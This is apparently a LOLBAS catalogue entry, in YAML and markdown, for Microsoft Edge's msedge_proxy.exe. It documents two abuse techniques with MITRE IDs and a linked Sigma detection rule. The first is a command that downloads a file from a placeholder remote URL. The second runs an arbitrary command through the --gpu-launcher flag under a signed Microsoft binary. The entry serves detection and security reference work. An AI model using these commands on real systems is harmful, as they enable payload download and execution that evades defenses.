---
Acknowledgement:
- Person: Mert Da
Author: "Mert Da\u015F"
Commands:
- Category: Download
  Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
  Description: msedge_proxy will download malicious file.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Execute
  Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox
    --gpu-launcher="{CMD} &&"
  Description: msedge_proxy.exe will execute file in the background
  MitreID: T1218.015
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Executes a process under a trusted Microsoft signed binary
Created: 2023-08-18
Description: Microsoft Edge Browser
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
Full_Path:
- Path: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe
Name: msedge_proxy.exe
mitre_data:
  technique_ids:
  - T1105
  - T1218.015
tags:
- lolbas/osbinaries
---

# msedge_proxy.exe

Microsoft Edge Browser

# Path(s)

- `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe`

# Execute Commands

msedge_proxy.exe will execute file in the background

```batch
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

- **Usecase:** Executes a process under a trusted Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1218.015`
- **Operating System(s):** Windows 10, Windows 11



# Download Commands

msedge_proxy will download malicious file.

```batch
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

- **Usecase:** Download file from the internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Mert Daş (Authored, 2023-08-18)
- Mert Da